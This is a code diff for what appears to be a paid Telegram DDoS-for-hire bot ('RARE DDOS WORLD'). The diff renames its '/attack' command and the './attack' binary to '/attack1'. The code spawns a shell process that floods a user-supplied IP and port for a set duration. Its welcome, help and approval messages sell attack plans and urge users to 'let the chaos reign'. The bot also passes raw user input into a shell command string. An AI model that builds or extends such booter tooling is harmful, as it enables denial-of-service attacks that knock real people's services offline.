@@ -174,7 +174,7 @@ def extend_and_clean_expired_users():
 
 
 async def run_attack_command_async(chat_id, target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./attack {target_ip} {target_port} {duration} 50")
+    process = await asyncio.create_subprocess_shell(f"./attack1 {target_ip} {target_port} {duration} 50")
     await process.communicate()
     
     bot.attack_in_progress = False
@@ -285,7 +285,7 @@ def approve_or_disapprove_user(message):
             f"✅ *Your account has been approved!*\n"
             f"📋 *Plan:* `{plan}`\n"
             f"⏳ *Valid for:* `{days} days`\n"
-            f"🔥 *You can now use the /attack command to unleash the full power of your plan.*\n"
+            f"🔥 *You can now use the /attack1 command to unleash the full power of your plan.*\n"
             f"💡 *Thank you for choosing our service! If you have any questions, don't hesitate to ask.*",
             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
 
@@ -518,7 +518,7 @@ def rules_command(message):
 def help_command(message):
     help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                  "*Here’s what you can do:* \n"
-                 "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
+                 "1. *`/attack1` - ⚔️ Launch a powerful attack and show your skills!*\n"
                  "2. *`/myinfo` - 👤 Check your account info and stay updated.*\n"
                  "3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*\n"
                  "4. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
@@ -549,8 +549,8 @@ def start_message(message):
     try:
         bot.send_message(message.chat.id, "*🌍 WELCOME TO RARE DDOS WORLD!* 🎉\n\n"
                                            "*🚀 Get ready to dive into the action!*\n\n"
-                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
-                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
+                                           "*💣 To unleash your power, use the* `/attack1` *command followed by your target's IP and port.* ⚔️\n\n"
+                                           "*🔍 Example: After* `/attack1`, *enter:* `ip port duration`.\n\n"
                                            "*🔥 Ensure your target is locked in before you strike!*\n\n"
                                            "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
                                            "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥", 
